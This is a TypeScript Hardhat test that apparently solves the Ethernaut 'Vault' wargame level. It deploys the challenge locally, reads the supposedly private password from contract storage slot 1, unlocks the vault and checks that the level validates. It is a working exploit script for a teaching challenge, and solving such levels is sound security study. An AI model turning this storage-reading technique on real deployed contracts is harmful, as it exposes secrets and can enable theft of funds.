import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";

const SLOT = 1;

describe("Vault exploit", () => {
  async function deployVaultFixture() {
    const [deployer, attacker] = await ethers.getSigners();
    const VaultFactory = await ethers.getContractFactory("VaultFactory");
    const vaultFactory = await VaultFactory.connect(deployer).deploy();
    await vaultFactory.deployed();

    // Simulate execution of createInstance to get return value of the function(address of deployed instance)
    const vaultAddress = await vaultFactory.connect(attacker).callStatic.createInstance(attacker.address);

    const tx = await vaultFactory.connect(attacker).createInstance(attacker.address);
    await tx.wait();

    // Load the instance at returned address
    const vault = await ethers.getContractAt("Vault", vaultAddress);

    return { attacker, vault, vaultFactory };
  }
  it("Should unlock the vault", async () => {
    const { attacker, vault, vaultFactory } = await loadFixture(deployVaultFixture);

    // Password is stored at slot number 1. Get value st storage slot number 1
    const password = await attacker.provider?.getStorageAt(vault.address, SLOT);

    // Unlock the vault using password
    const tx = await vault.unlock(password!);
    await tx.wait();

    // test
    // Assert that 'locked' is set to false
    const locked = await vault.locked();
    expect(locked).to.be.false;

    // Validate the instance using Ethernaut validation.
    const success = await vaultFactory.connect(attacker).validateInstance(vault.address, attacker.address);
    expect(success).to.be.true;
  });
});
